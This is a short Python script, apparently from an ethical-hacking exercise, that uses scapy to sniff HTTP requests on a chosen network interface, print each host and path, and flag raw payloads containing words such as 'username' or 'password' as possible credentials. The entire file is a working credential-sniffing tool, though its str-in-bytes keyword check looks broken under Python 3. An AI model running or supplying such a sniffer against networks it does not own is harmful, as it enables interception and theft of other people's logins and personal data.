#!/usr/bin/env python

import scapy.all as scapy
import argparse
from scapy.layers import http
import pdb

def get_interface():
  parser = argparse.ArgumentParser()
  parser.add_argument("-i", "--interface", dest="interface", help="Specify interface to sniff packets")
  arguments = parser.parse_args()
  return arguments.interface

def sniff(iface):
  scapy.sniff(iface=iface, store=False, prn=process_packet)

def process_packet(packet):
  if packet.haslayer(http.HTTPRequest):
    # pdb.set_trace()
    print("[+] HTTP Request >> " + (packet[http.HTTPRequest].Host.decode("utf-8"))  + (packet[http.HTTPRequest].Path.decode("utf-8"))  )
    if packet.haslayer(scapy.Raw):
      load = packet[scapy.Raw].load
      keys = ["username", "password", "pass", "email"]
      for key in keys:
        if key in load:
          print("[+] Posible password/username >> " + load)
          break
      

  
iface = get_interface()
sniff(iface)
